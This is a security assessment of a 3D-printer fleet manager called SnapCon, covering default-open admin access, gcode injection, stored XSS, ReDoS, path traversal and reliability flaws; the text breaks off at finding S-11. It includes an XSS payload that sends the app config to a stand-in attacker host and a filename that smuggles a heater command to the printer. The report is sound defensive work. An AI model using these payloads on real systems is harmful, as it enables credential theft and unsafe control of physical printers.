# SnapCon — Application Security Assessment

**Scope**: full repository, `review/baseline` branch. Static, read-only source
review — no files modified, no scripts/binaries/migrations executed against
the application. Node's REPL was used only to reproduce two pure-function
timing/behavior claims in isolation (a regex against a literal string, and a
`Math.max(...set)` call) — neither touched the application, its config, or
any network/filesystem state belonging to it.

Every finding below cites the exact file/line reviewed and states how it was
confirmed. Findings without a demonstrated reachable code path are not
included — several categories in the requested checklist (SQL injection,
LDAP injection, unsafe deserialization, CORS misconfiguration, open redirect)
have **no finding** because the code path that would enable them does not
exist in this codebase; see "Categories checked with no finding" at the end
for why, rather than silence standing in for "not checked."

---

## 1. Threat Model

### 1.1 What SnapCon is

A single Node/Express process (`server.js`) that (a) serves a hand-written
static frontend, (b) watches a local folder of sliced gcode files, and (c)
relays print-control commands to real, physical 3D printers on the LAN over
their native HTTP APIs (Moonraker/Klipper, FlashForge). Optional features:
a local user-account system (`auth.js`), outbound notifications (ntfy.sh,
Telegram, Resend), and a managed Cloudflare Tunnel ("Remote Access") that can
expose the instance to the public internet.

### 1.2 Assets being protected

| Asset | Where it lives |
|---|---|
| Physical printer control (heat, motion, start/cancel print) | Sent live to LAN devices via connector modules |
| Sliced gcode files (may embed proprietary model/customer data) | `gcodeFolder` on disk |
| User credentials (password hashes, session tokens) | `users.json`, in-memory `SESSIONS` Map |
| Printer API tokens, notification bot tokens, Resend API key | `config.json` (plaintext) |
| Remote Access tunnel token + Ed25519 private key | OS keychain (DPAPI/Keychain/Secret Service) or, if opted in, an AES-256-GCM-encrypted local file |
| Host filesystem (indirectly, via the folder browser) | Whatever the OS user running SnapCon can read |
| Availability of the whole fleet-management service | The single Node event loop |

### 1.3 Entry points

- `GET/POST/PUT/DELETE /api/*` — the entire browser-facing API surface (~70 routes)
- `GET /`, `GET /orca/:name` — static app shell
- `POST /api/notify-load` — reachable two ways: (a) raw-bytes push from *anywhere on the LAN* (`requireRegular`-gated), (b) JSON path-reference mode gated to loopback callers only (`isLoopback()`)
- The `--load`/`--snapcon` CLI flags on the same binary, which is really just a client of (a)/(b) above
- Inbound responses from configured printers (semi-trusted device data — `probe()`, `getFileMetadata()`, thumbnails, discovery scans)
- Inbound responses from external services (ntfy.sh, api.telegram.org, api.resend.com, api.openei.org, api.zippopotam.us, api.snapcon.app, github.com release assets)
- `cloudflared`'s stdout/stderr (parsed for connection-state evidence)

### 1.4 Trust boundaries

1. **Browser ↔ server.** Gated by `auth.makeAuthMiddleware()` — but see Finding S-1: this boundary is *disabled by default*.
2. **Server ↔ printer.** Printers are LAN devices; SnapCon treats most of their responses as trustworthy device telemetry rather than attacker-controlled input — Finding S-3 shows this trust is misplaced for at least one field.
3. **Server ↔ external services.** ntfy.sh/Telegram/Resend/OpenEI/Zippopotam/api.snapcon.app/GitHub. Outbound only, mostly with fixed hostnames; Finding S-9 is the one place a request header influences an outbound URL.
4. **Loopback vs. LAN vs. public internet**, via `isLoopback()` and, when Remote Access is enabled, a Cloudflare Tunnel that makes the LAN boundary moot for whatever reaches the tunnel.
5. **Role boundary within an authenticated session** — `view` < `regular` < `admin`, enforced per-route by `requireAuth`/`requireRegular`/`requireAdmin`.

### 1.5 Privileged components

- `POST /api/config` (`requireAdmin`) — rewrites the entire server configuration, including which folder is exposed as the file jail.
- `GET /api/browse` (`requireAdmin`) — arbitrary host-filesystem directory enumeration (folder picker), not confined to `gcodeFolder`.
- `POST /api/restart` (`requireAdmin`, Docker-only) — exits the process, relying on `restart: unless-stopped` to relaunch it.
- `POST /api/remote-access/*` (`requireAdmin`) — spawns/supervises a `cloudflared` child process and can make the instance reachable from the public internet.
- `POST /api/users`, `PUT/DELETE /api/users/:id` (`requireAdmin`) — full account management, including granting/revoking admin.
- Every connector's `startPrintFile`/`excludeObject` sink in `connectors/http-utils.js` — the point where a filename/object-name string becomes a literal line in a script executed by the printer's firmware.

### 1.6 External integrations (and what's sent to them)

| Service | Data sent | Auth |
|---|---|---|
| ntfy.sh | topic name, printer name, print status text, optional camera snapshot, a link back to the instance's own icon | none (topic = shared secret by convention) |
| api.telegram.org | bot token (in the URL path), chat ID, message text, optional snapshot | bot token |
| api.resend.com | API key (bearer), from/to addresses, OTP code in plaintext email body | API key |
| api.openei.org / api.zippopotam.us | 5-digit ZIP code | optional API key (defaults to public `DEMO_KEY`) |
| api.snapcon.app | Ed25519-signed hub-lifecycle requests, installation ID | per-request Ed25519 signature + nonce + timestamp |
| github.com (release assets) | nothing (download only) | none — response verified against a committed SHA-256 manifest |

### 1.7 Attacker capability tiers assumed in this review

- **A0 — unauthenticated LAN/network client.** Anyone who can route a TCP packet to port 4545. On the documented default configuration (`usersEnabled: false`, `network_mode: host`), this tier *is* A3 below.
- **A1 — `view`-role authenticated user.**
- **A2 — `regular`-role authenticated user** (can push files and control prints).
- **A3 — `admin`-role authenticated user**, or anyone treated as one implicitly.
- **A4 — a malicious/compromised printer, or a LAN man-in-the-middle of printer traffic** (all printer HTTP traffic observed in this codebase is plain `http://`).
- **A5 — local filesystem access to the SnapCon host** (out of scope for most findings — already game over — used only where a finding specifically changes what A5 can additionally do, e.g. exfiltrate a secret that would otherwise require OS-keychain access).

---

## 2. Findings

Ordered most-severe first.

---

### S-1. `usersEnabled: false` (the shipped default) grants every network caller implicit admin over the entire API, including a host-filesystem browser and live printer control

- **Severity**: Critical
- **CWE**: CWE-306 (Missing Authentication for Critical Function), CWE-1188 (Insecure Default Initialization of Resource)
- **File/line**: `auth.js:120-123` (`makeAuthMiddleware`); `server.js:40` (`DEFAULT_CFG` has no `usersEnabled` key, so it's falsy); `config.example.json` (ships with no `usersEnabled` key either); `docker-compose.yml:22` (`network_mode: host`, recommended for LAN auto-discovery)
- **Attack prerequisites**: Network/TCP reachability to the SnapCon port (4545 by default). No credentials of any kind.
- **Exploitation path**:
  1. A fresh install (`npm start`, the packaged `.exe`, or `docker compose up -d` per the project's own quick-start) has no `users.json` and `CFG.usersEnabled` unset → falsy.
  2. Every request hits `authMiddleware` (`server.js:204`): `if (!cfg.usersEnabled) { req.user = { role: "admin", implicit: true }; return next(); }` (`auth.js:123`).
  3. Every `requireAdmin` route now succeeds for anyone. This includes `GET /api/browse` (full directory-tree enumeration of the host filesystem, not jailed to `gcodeFolder` — `server.js:988-1017`), `POST /api/config` (rewrite all settings), `POST /api/printer-tags`, user management, and Remote Access enable/disable.
  4. Every `requireRegular` route also succeeds: upload arbitrary gcode to the watched folder, push it to any configured printer, and start prints — i.e. full physical control of every printer SnapCon manages.
  5. Docker's own quick-start (`docker-compose.yml:1-11`) recommends `network_mode: host` specifically "for LAN auto-discovery," which means this exposure is to the whole LAN segment, not just `localhost`, on the documented, recommended deployment path.
- **Impact**: Complete compromise of the management plane and physical control of every printer, with zero authentication, on the default configuration.
- **Evidence**:
  ```js
  // auth.js:120-123
  function makeAuthMiddleware(getCfg, getUsers) {
    return function authMiddleware(req, res, next) {
      const cfg = getCfg();
      if (!cfg.usersEnabled) { req.user = { role: "admin", implicit: true }; return next(); }
  ```
  ```js
  // server.js:40
  const DEFAULT_CFG = { gcodeFolder: "./gcode", port: 4545, printers: [] };
  ```
- **Recommended remediation**: This is a documented, deliberate design trade-off (per `CLAUDE.md`: "optional... the entire back-compat story for pre-auth installs"), so a full redesign may be out of scope — but the current UX gives an operator no signal that this is happening. At minimum: (1) surface a persistent, unmissable banner in the UI when running with `usersEnabled` off and reachable on a non-loopback interface; (2) default `docker-compose.yml` to the `ports:` mapping (bound to the host, not `network_mode: host`) with a comment explaining the LAN-exposure trade-off, so auto-discovery is an opt-in expansion of the attack surface rather than the default; (3) consider refusing to bind to a non-loopback address at all until either `usersEnabled` is explicitly set `true` or an explicit `--i-understand-this-is-unauthenticated` flag/env var is passed.
- **How to test the remediation**: Start the app with a config containing no `usersEnabled` key, from a second machine on the same network run `curl http://<host>:4545/api/browse?drives=1` (Windows) or `curl http://<host>:4545/api/config` — after the fix, either the port isn't reachable non-locally, or the UI/logs make the exposure unmissable and documentation/compose defaults no longer suggest LAN-wide binding as the norm.
- **Confidence**: High — every cited line was read directly; this is also explicitly acknowledged in the codebase's own comments as intentional, which is precisely why it needs a mitigations layer rather than being dismissed.

---

### S-2. Gcode/argument injection via unsanitized upload filename reaches the printer's command interpreter

- **Severity**: Critical
- **CWE**: CWE-93 (Improper Neutralization of CRLF Sequences), CWE-77 (Command Injection, protocol-level)
- **File/line**: `server.js:361-375` (`POST /api/files/upload`, missing validation) → `server.js:495,523` (`name = path.basename(fp)`, then `c.startPrintFile(p, name)`) → `connectors/http-utils.js:41,82,97` (injection sink)
- **Attack prerequisites**: An authenticated `regular`-role account (or, per S-1, anyone at all on the default config) that can reach `POST /api/files/upload` and later `POST /api/print`.
- **Exploitation path**:
  1. `POST /api/files/upload?name=<crafted>` only validates the extension:
     ```js
     // server.js:365-368
     const name = path.basename(String(req.query.name || "").trim());
     if (!name || !/\.(gcode|gco|g|gx|3mf)$/i.test(name)) { ... }
     ```
     No check for `"`/`\r`/`\n`, unlike the sibling routes `/api/printfile` (`server.js:574`, `/["\r\n]/`) and `/api/exclude` (`server.js:628`, same regex). On Linux/ext4 (the primary Docker/Pi/NAS target per the project's own `docker-compose.yml` header), `\r`/`\n`/`"` are legal filename bytes, so `fs.writeFileSync(target, req.body)` (`server.js:373`) persists a file whose name contains an embedded newline.
  2. `POST /api/print` later derives `name = path.basename(fp)` from that same on-disk filename (`server.js:495`) and, when `start:true`, calls `c.startPrintFile(p, name)` (`server.js:523`).
  3. Every Klipper-family connector re-exports the shared sink unchanged:
     ```js
     // klipper-moonraker.js:73 / creality-klipper.js:87 / snapmaker-u1-klipper.js:118
     exports.startPrintFile = http.startPrintFile;
     ```
     ```js
     // connectors/http-utils.js:41,82
     const sendGcode = (p, script) => moonrakerPost(p, "/printer/gcode/script?script=" + encodeURIComponent(script));
     const startPrintFile = (p, filename) => sendGcode(p, `SDCARD_PRINT_FILE FILENAME="${filename}"`);
     ```
     `encodeURIComponent` protects the *HTTP request line* from injection, but Moonraker decodes the query string back into a `script` value containing the real embedded newline before dispatching it to Klipper's gcode interpreter — which executes a multi-line `script` value one command per line. A filename of
     `part.gcode\nSET_HEATER_TEMPERATURE HEATER=extruder TARGET=999.gcode`
     becomes two gcode commands: the intended print-start macro, and an attacker-chosen second command sent to a real, physical, unattended machine.
- **Impact**: Arbitrary additional gcode/macro execution on physical printer hardware — ranging from denial of service (aborting/corrupting a print) to a genuine safety hazard (heater or motion commands with no operator present).
- **Evidence**: cited above; the contrast with `/api/printfile`/`/api/exclude`'s validation (present) versus `/api/files/upload` (absent) was confirmed by reading all three route handlers directly.
- **Recommended remediation**: Reject `"`, `\r`, `\n` in `/api/files/upload`'s `name` (matching the other two routes), and — as defense in depth, since this sink is shared by every current and future Klipper-family connector — have `http-utils.js`'s `startPrintFile`/`excludeObject` themselves strip or reject those characters before interpolating into a gcode script, rather than trusting every caller to have validated upstream.
- **How to test the remediation**: `curl -X POST "http://host:4545/api/files/upload?name=x%0ASET_HEATER_TEMPERATURE%20HEATER=extruder%20TARGET=999.gcode" --data-binary @test.gcode -H "Content-Type: application/octet-stream"` should now return 400; if it's ever allowed through, confirm on a real (or mocked) Moonraker instance that the resulting `SDCARD_PRINT_FILE` script contains a single line only.
- **Confidence**: High — traced end-to-end from HTTP entry point to sink; all three connector re-exports confirmed by direct grep/read.

---

### S-3. Stored XSS via unsanitized FlashForge filament color, reachable by any authenticated viewer and chainable into admin-gated SSRF-capable endpoints

- **Severity**: Critical
- **CWE**: CWE-79 (Stored XSS) chained to CWE-918 (SSRF) and CWE-863 (session/role misuse via a hijacked admin browser)
- **File/line**: `connectors/flashforge-utils.js:198-199` (unsanitized source) → `server.js:555-567` (`GET /api/printer-file-meta`, proxies unchanged) → `public/app.js:2189` (and `:2178`, `:2180`) (unescaped `innerHTML` sink)
- **Attack prerequisites**: A2 (any `regular`/`admin` user opens "Print from printer" on a FlashForge printer whose `/gcodeList` response has been tampered with), and A4 (control of, or MITM on, that printer's plaintext-HTTP API response).
- **Exploitation path**:
  1. `getFileMetadata()` takes `materialColor` verbatim from the printer's own JSON, with no shape check:
     ```js
     // connectors/flashforge-utils.js:198-199
     const palette = (detail.gcodeToolDatas || []).map((t, i) => ({
       i, hex: t.materialColor || null, ...
     ```
     Every other hex-color path in the codebase runs the value through `normHex()` (`parser.js:46-53`, strict `#RRGGBB`/`#RGB` or `null`) — including a sibling function in `flashforge-ad5x.js:115-116` that *does* call `normHex()` on the same field for a different purpose, showing the omission here is an inconsistency, not a deliberate choice.
  2. `GET /api/printer-file-meta` (`requireAuth` only — the lowest role) forwards this unchanged to the browser.
  3. `public/app.js` interpolates it directly into an `innerHTML` template with no `esc()` call:
     ```js
     // app.js:2189
     `<div class="fsq${fDark?' light-bg':''}" style="background:${n.hex||'#3a3f49'}">...`
     ```
     while `app.js:2311` demonstrates the correct pattern (`style="background:${esc(c.hex)}"`) for a *different* color source, confirming this is a gap, not the app's general posture.
  4. A `materialColor` value such as `red"><img src=x onerror="fetch('/api/config').then(r=>r.text()).then(t=>fetch('//attacker/x?'+btoa(t)))">` breaks out of the `style` attribute and executes in the DOM of any user who views that file's metadata.
- **Impact / chain**: Session cookies are `httpOnly` so `document.cookie` isn't directly readable, but same-origin `fetch()` from injected script automatically carries the session cookie. If the victim is an **admin**, the injected script can silently call any `requireAdmin` route as that admin — including `GET /api/browse` (host filesystem enumeration), `GET /api/probe-printer?url=...` and `GET /api/test-connection?url=...&connector=...` (both admin-gated but *attacker-URL-taking* — see S-3a below), `POST /api/remote-access/enable` (expose the instance to the public internet), and full `POST /api/config`/user-management takeover.
- **Evidence**: confirmed by direct read of all four cited locations; `app.js:2311`'s correct `esc()` usage confirmed as a contrasting example in the same file.
- **Recommended remediation**: Run `materialColor` through `normHex()` (already exported from `parser.js`) in `getFileMetadata()`, falling back to `null`. Defense in depth: wrap every `style="background:${...hex...}"` interpolation in `app.js` with `esc()`, matching the one call site that already does this correctly, so no single unsanitized data source can reach an unescaped sink anywhere in the render path. Also add a `Content-Security-Policy` (see S-11) so even a missed sink can't execute inline script.
- **How to test the remediation**: Point a test/mock FlashForge printer's `/gcodeList` response at a `materialColor` value containing `"><script>` and confirm (a) the server-side palette entry becomes `null`, and (b) even if it didn't, the rendered DOM shows literal escaped text, not a new element/attribute.
- **Confidence**: High — full chain re-read directly; the SSRF-chain routes below are separately confirmed reachable and admin-only, consistent with what stolen admin credentials/session would unlock.

#### S-3a. (Sub-finding, folded into S-3's impact) Admin-gated endpoints accept a caller-supplied URL and fetch it server-side

- **File/line**: `server.js:2045-2054` (`GET /api/probe-printer`), `server.js:2062-2081` (`GET /api/test-connection`)
- **Note**: these are intended admin functionality (testing a printer's address before saving it) and are not a vulnerability in isolation — an admin is already trusted to configure arbitrary printer URLs. They matter here only as the *payload* of S-3's XSS chain: a hijacked admin browser can use them as a same-origin SSRF primitive against the server's own network position (e.g. probing internal-only hosts/ports the browser itself couldn't reach directly), since neither endpoint restricts the target to a known-printer's address, a private-IP allowlist, or a scheme other than whatever `fetch`/`fetchJSONTimeout` will follow.
- **Confidence**: High that the routes behave as described; the SSRF *severity* is entirely conditional on S-3 (or another admin-session compromise) actually occurring first — recorded here rather than as a standalone finding to avoid double-counting.

---

### S-4. Catastrophic-backtracking regex in the gcode parser freezes the entire server on one crafted file

- **Severity**: Critical
- **CWE**: CWE-1333 (Inefficient Regular Expression Complexity) / CWE-400 (Uncontrolled Resource Consumption)
- **File/line**: `parser.js:18` (`CFG_RE`), exercised by `feed()` at `parser.js:62-63` for every line of every parsed file; reachable via `GET /api/map` (`server.js:377`, `requireAuth`)
- **Attack prerequisites**: Ability to get one file into the watched `gcodeFolder` (A2 upload, or A5/A4 direct filesystem drop), then any A1+ (or A0 on default config) request to `GET /api/map?file=<name>`.
- **Exploitation path**: `CFG_RE = /^\s*;\s*([A-Za-z0-9_ %\[\]\(\)\/.-]+?)\s*=\s*(.*?)\s*$/` has two adjacent quantifiers (`\s*` and the lazy character class, which itself includes a literal space) with no distinguishing boundary. A comment line consisting of `;` followed by a long run of spaces and no `=` forces the engine to explore a combinatorial number of ways to split that run between the two quantifiers.
- **Verification (reproduced directly against the exact regex from the file)**:
  ```
  500  chars ->  379ms
  1000 chars ->  713ms
  1500 chars -> 2394ms
  2000 chars -> 5656ms
  ```
  Roughly cubic-or-worse blowup; the growth rate makes an 8-10KB line (trivial to embed in a gcode comment, which has no length limit enforced anywhere before this regex runs) a multi-minute-or-longer full event-loop freeze.
- **Impact**: One HTTP request, from the lowest authenticated role (or anyone, on default config), freezes Node's single event loop — every printer, every user, the entire fleet-management server — for as long as the regex runs.
- **Evidence**: reproduced by direct execution of the file's own regex against synthetic input; route gating confirmed by reading `server.js:377`.
- **Recommended remediation**: Replace with a manual, non-backtracking parse (`indexOf(';')`/`indexOf('=')`/`slice`/`trim`), or restructure so the two adjacent quantifiers can never match the same characters (e.g. disallow raw spaces inside the key class and require the key to end at a non-space boundary). Defense in depth: cap line length before regex matching (a few KB is generous for any real slicer config line).
- **How to test the remediation**: Feed a line of `;` + 20,000 spaces (no `=`) into `parseGcodeMap()` directly and assert it returns in well under 100ms.
- **Confidence**: High — reproduced by direct execution in this review.

---

### S-5. Directory-jail bypass in `safePath()` via a non-boundary-respecting prefix check

- **Severity**: High
- **CWE**: CWE-22 (Path Traversal) / CWE-706 (Use of Incorrectly-Resolved Name)
- **File/line**: `server.js:232-236` (`safePath`), duplicated inline at `server.js:326` (mkdir) and `server.js:370` (upload)
- **Attack prerequisites**: A2 (`regular`-role, or A0 on default config), plus a sibling directory next to the configured `gcodeFolder` whose name shares it as a literal string prefix (e.g. `gcode` and `gcode-backup`, or a Windows `gcode (1)` copy).
- **Exploitation path**:
  ```js
  // server.js:232-236
  function safePath(sub) {
    if (!sub) return null;
    const p = path.resolve(FOLDER, sub);
    return p.startsWith(FOLDER) ? p : null;
  }
  ```
  `String.prototype.startsWith` has no path-segment awareness. If `FOLDER` resolves to `/app/gcode`, then `/app/gcode-backup/x".startsWith("/app/gcode")` is `true`. A request like `GET /api/files?sub=../gcode-backup` (or the equivalent to the mkdir/upload routes, which duplicate the same flawed check rather than calling `safePath()`) escapes the intended jail into that sibling.
- **Impact**: Read, create, or overwrite files in any sibling directory whose name happens to prefix-match, outside the folder the admin intended to expose — depends on such a sibling existing, which is a plausible but not guaranteed real-world layout.
- **Evidence**: all three occurrences read directly; the flaw is a deterministic property of `startsWith`, not conditional on the printer/OS.
- **Recommended remediation**: `p === FOLDER || p.startsWith(FOLDER + path.sep)`, applied everywhere the pattern is duplicated — or route every one of these checks through `safePath()` itself instead of re-implementing it per call site.
- **How to test the remediation**: Create `gcode/` and `gcode-evil/marker.txt` side by side; `GET /api/files?sub=../gcode-evil` must now 400, and must continue to 400 after the fix even though the literal-prefix relationship between the two folder names is unchanged.
- **Confidence**: Medium-High — the logic flaw is certain; real-world exploitability depends on a matching sibling directory existing, which is plausible (backup folders, OS-generated "copy" names) but not universal.

---

### S-6. No rate limiting or lockout on `/api/login` — online password brute force

- **Severity**: High
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts) / CWE-799
- **File/line**: `server.js:1458-1468` (`POST /api/login`); confirmed absent: no rate-limiting middleware anywhere in `server.js`, and `package.json`'s only runtime dependency is `express` — no `express-rate-limit` or equivalent.
- **Attack prerequisites**: Network reachability to `/api/login` plus a valid `loginName` (which itself isn't rate-limited to guess, see S-6a).
- **Exploitation path**: `verifyPassword()` uses `scrypt` (tens of milliseconds per attempt, `SCRYPT_N=16384`), which is good practice against fast hash cracking but does nothing to stop an attacker sending repeated `POST /api/login` requests over the network — there is no per-IP, per-account, or global request-rate limit, and no lockout after N failures (contrast with the OTP path, which *does* cap at 5 attempts — `auth.js:98`, `OTP_MAX_ATTEMPTS`). An attacker with a plausible login name and a wordlist can attempt passwords indefinitely, limited only by their own network throughput and scrypt's fixed per-attempt cost.
- **Impact**: Full account takeover of any user (including an admin) whose password is present in a reasonably-sized wordlist, with no server-side friction beyond scrypt's constant per-attempt delay.
- **Evidence**: `server.js:1458-1468` read directly; absence of any rate-limiting dependency confirmed via `package.json`.
- **Recommended remediation**: Add per-account and per-IP attempt throttling/lockout to `/api/login` (and `/api/login/otp/request`, S-13), mirroring the OTP path's existing 5-attempt cap pattern. A fixed in-memory counter keyed by `loginNameLower` with exponential backoff is consistent with this codebase's existing in-memory-state conventions (`SESSIONS`, `OTP_CODES`) and needs no new dependency.
- **How to test the remediation**: Script 20 rapid `POST /api/login` attempts against one account with wrong passwords; after the fix, later attempts should be rejected/delayed well before attempt 20, independent of whether the password is eventually correct.
- **Confidence**: High — confirmed by reading the route and by dependency-list inspection.

#### S-6a. Login-name enumeration via response timing

- **Severity**: Low (folded in as a compounding factor for S-6, not double-counted in severity)
- **CWE**: CWE-203 (Observable Timing Discrepancy)
- **File/line**: `server.js:1461-1464`
- **Exploitation path**: `findUserByLoginName()` returns immediately (no scrypt call) for a nonexistent login; a real account pays a real scrypt computation before the same generic `"Invalid login name or password"` is returned — making account existence distinguishable by response latency, which narrows S-6's search space to accounts confirmed to exist.
- **Remediation**: Perform a dummy, comparably-costed hash comparison on the not-found path too.
- **Confidence**: Medium.

---

### S-7. Cloudflared spawn failure permanently deadlocks Remote Access Enable/Disable/Restart

- **Severity**: High
- **CWE**: CWE-667 (Improper Locking) / CWE-772 (Missing Release of Resource, in effect a stuck promise chain)
- **File/line**: `remote-access/CloudflaredManager.js:251-252` (`running = true` set before spawn success is known), `:278` (`error` handler doesn't reset state, unlike `exit` at `:270-277`), `:291-306` (`stop()`)
- **Attack prerequisites**: None adversarial — this is a reliability bug triggered by an environment condition (binary deleted between verification and exec, permission denied, a `noexec` mount — all realistic on the Docker/Pi targets this feature explicitly supports), included here because it is a full denial of service for the Remote Access subsystem with no self-recovery.
- **Exploitation/trigger path**: `spawnChild()` sets `running = true` immediately after calling `spawnFn()`, before the OS has confirmed the process actually launched. If `spawn()` fails at the OS level, Node emits `'error'` — which here only sets `lastError`, never resetting `running`/`child` the way the sibling `'exit'` handler does. `stop()` then sees `running=true && child` truthy and takes the "wait for real exit" branch: it registers `proc.once("exit", finish)` (which can now never fire) and calls `proc.kill("SIGTERM")` on a `ChildProcess` with no real PID (a no-op, neither throwing nor emitting `'exit'`). The returned `Promise` never resolves, and since `start`/`stop`/`restart` are serialized behind one shared queue (`serialize.js`), every subsequent Remote Access action — from any admin — hangs forever until the entire SnapCon process is restarted.
- **Impact**: Full, unrecoverable-without-a-process-restart denial of service of the Remote Access feature (not the whole server — see confidence note below).
- **Evidence**: all cited lines read directly; Node's documented `'error'`-without-`'exit'` spawn-failure semantics were checked against this exact handler code.
- **Recommended remediation**: In the `child.on("error", ...)` handler, also do what the `exit` handler does — `running = false`, `child = null`, clear `InstanceLock`, call `scheduleRestart()`. In `stop()`, resolve on either `'exit'` **or** `'error'`, and resolve immediately if the child never obtained a real `pid`.
- **How to test the remediation**: Inject a `spawnFn` that synchronously throws/emits `'error'` with no `'exit'` (the existing test suite's DI pattern supports this — see `test/remote-access/cloudflaredManager.test.js`); assert `stop()` resolves within a bounded time instead of hanging.
- **Confidence**: High for the mechanism (traced against documented Node semantics and the exact handler code). Note: blast radius is confined to the admin-gated Remote Access subsystem, not fleet management or the rest of the Express server — narrower than S-4, which freezes the whole process.

---

### S-8. Unhandled promise rejection in the Remote Access registration poll can crash the entire process

- **Severity**: High
- **CWE**: CWE-248 (Uncaught Exception) — process-wide impact via Node's default unhandled-rejection behavior
- **File/line**: `remote-access/RemoteAccessService.js:181` (bare `setTimeout` callback), `:184-229` (`runRegistrationPoll`, try/catch covers only the first await), `:251` (unguarded `Ed25519Identity.importPrivateKeyJwk`)
- **Attack prerequisites**: The persisted `ed25519PrivateKeyJwk` becomes corrupted (e.g. via S-10's non-atomic write torn by a crash, or any other on-disk corruption a store's `get()` returns as non-null garbage rather than `null`).
- **Exploitation path**: `scheduleRegistrationPoll()` fires `runRegistrationPoll` from a bare `setTimeout` with no `.catch()`. Only the `getRegistrationSessionStatus()` call is try/catched; the subsequent `await serialize(() => completeRegistrationAndProvision(...))()` (`:228`) is not, and inside it `await Ed25519Identity.importPrivateKeyJwk(privateKeyJwk)` (`:251`) will reject on a malformed key. That rejection propagates out of the discarded `setTimeout` callback as an unhandled rejection. No `process.on('unhandledRejection', …)` handler exists anywhere in the codebase (confirmed by repo-wide search), and Node terminates the process by default on an unhandled rejection — taking down all of SnapCon, every printer, every connected user, not just Remote Access.
- **Impact**: Full process crash from a single corrupted local file, escalating what should be an isolated feature's error state into a total outage.
- **Evidence**: all lines read directly; repo-wide grep for `unhandledRejection`/`uncaughtException` returned no matches outside this review's own output files.
- **Recommended remediation**: Wrap the full body of `runRegistrationPoll` — including the `completeRegistrationAndProvision` call — in try/catch that sets `state="error"`/`lastError`. Defense in depth: add a top-level `process.on('unhandledRejection', ...)` logger in `server.js` so a similar bug degrades to a log line instead of a full outage.
- **How to test the remediation**: Inject a `secureStore.get` that returns a syntactically-valid-JSON-but-cryptographically-invalid JWK during an in-flight registration poll; assert the process stays up and `state` becomes `"error"`.
- **Confidence**: Medium-High — the missing try/catch and absent global handler are both confirmed directly; real-world trigger frequency depends on how often the precondition occurs.

---

### S-9. Printer API "token" is functionally unused for authentication except in one place where it leaks in cleartext

- **Severity**: Medium-High
- **CWE**: CWE-319 (Cleartext Transmission of Sensitive Information) / CWE-522 (Insufficiently Protected Credentials)
- **File/line**: `connectors/snapmaker-u1-klipper.js:186-189` (only use of `p.token`); absence confirmed by repo-wide search for `Authorization`/`X-Api-Key`/`.token` across `connectors/*.js` and `server.js`
- **Attack prerequisites**: A4 (LAN position able to observe traffic to/from the printer, or read the printer's own HTTP access log).
- **Exploitation path**: `server.js`'s own `publicCfg()` (`:1225-1230`) treats a printer's `token` field as "a real secret" — it's redacted from every API response and only round-trips when actively being replaced. Yet a repo-wide search shows this value is used in exactly one place in the entire connector layer:
  ```js
  // connectors/snapmaker-u1-klipper.js:186-188
  const ip   = new URL(http.baseUrl(p)).hostname;
  const token = p.token || "";
  const wsUrl = `ws://${ip}/websocket${token ? "?token=" + encodeURIComponent(token) : ""}`;
  ```
  Every other outbound call to a printer — every `moonrakerPost`, every `fetchJSONTimeout`/`fetchTimeout` in `http-utils.js`, every upload — sends **no** `Authorization` header and no API-key header of any kind. So for the large majority of calls, a configured token provides no actual authentication to a Moonraker instance that has `[authorization]`/API-key enforcement turned on (those calls would simply fail, or the printer must be left unauthenticated for SnapCon to function at all) — and in the one place the token *is* used, it's placed in a plaintext `ws://` URL's query string, which is typically recorded in the target server's own access logs and is trivially visible to anyone else on the LAN segment or with printer log access.
- **Impact**: A value the codebase itself classifies as a secret is either not actually protecting anything (unused paths) or is actively exposed in transit and in logs (the one path that uses it) — worse than not having a token field at all, since it creates a false sense of the printer connection being authenticated.
- **Evidence**: confirmed by direct read of `snapmaker-u1-klipper.js:186-189` and a repo-wide grep for `Authorization`/`X-Api-Key`/`.token` across every connector file and `server.js`, which returned this as the only outbound use.
- **Recommended remediation**: Either (a) wire `p.token` into an `Authorization`/`X-Api-Key` header on every Moonraker REST call in `http-utils.js` (matching whatever Moonraker's actual `[authorization]` scheme expects), and stop sending it as a URL query parameter on the WebSocket path, or (b) if the token field is legacy/unused, remove it from the config schema and UI rather than presenting it to admins as a functioning secret.
- **How to test the remediation**: Configure a printer with `token` set, point it at a Moonraker instance with API-key enforcement on, and confirm SnapCon's REST calls now succeed (they should currently fail or require the printer to be left open); separately confirm the WS handshake no longer places the token in the URL (e.g. via a `Sec-WebSocket-Protocol` header or an authenticated subprotocol, whatever the printer firmware supports).
- **Confidence**: Medium — the connector-layer omission is certain from direct source inspection; whether any deployed printer actually enforces Moonraker's `[authorization]` block (making this exploitable rather than merely inconsistent) wasn't verified against real hardware in this review.

---

### S-10. Non-atomic writes for Remote Access secrets/config

- **Severity**: Medium
- **CWE**: CWE-362 (race condition on write) / CWE-460 (Improper Cleanup on failure path)
- **File/line**: `remote-access/RemoteAccessStore.js:57`; `remote-access/SecureCredentialStore.js:194` (Windows DPAPI path), `:244` (insecure-fallback path)
- **Attack prerequisites**: A process kill (OOM-killer, `docker stop -t 0`, power loss) at the exact moment one of these files is being written.
- **Exploitation path**: `CloudflaredManager.download()` deliberately writes to a `.part` file and `renameSync`s it into place to fail closed on a crash mid-write (`CloudflaredManager.js:116-118`). `RemoteAccessStore.save()` and both `SecureCredentialStore` disk-backed paths instead call `fs.writeFileSync()` directly on the final path, with no equivalent temp-file-then-rename step — a crash mid-write leaves `remote-access.json` or a credential blob truncated/corrupt, which (per S-8) can additionally crash the whole server, not just lose Remote Access's state.
- **Impact**: Loss of Remote Access identity/hostname state or the tunnel token itself on next boot; combined with S-8, a full process crash.
- **Evidence**: all three write sites read directly; contrasted with `CloudflaredManager.js`'s own documented atomic-write reasoning for the same category of file.
- **Recommended remediation**: Use the same temp-file + `renameSync` pattern already used (and justified in its own comments) by `CloudflaredManager.download()`.
- **How to test the remediation**: Kill the process (`SIGKILL`) mid-write to `remote-access.json` (e.g. via an injected delay in tests) and confirm the file is never left in a truncated state — either the old or the new content, never partial bytes.
- **Confidence**: Medium — the asymmetry with `download()`'s own reasoning is clear from the code; requires an exact-timing crash to trigger in practice.

---

### S-11. No security response headers anywhere in the application

- **Severity**: Medium
- **CWE**: CWE-693 (Protection Mechanism Failure) / CWE-1021 (Improper Restriction of Rendered UI Layers, i.e. clickjacking)
- **File/line**: repo-wide — confirmed absent via search across `server.js` for `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, and any `helmet`-style dependency (`package.json` has only `express` as a runtime dependency)
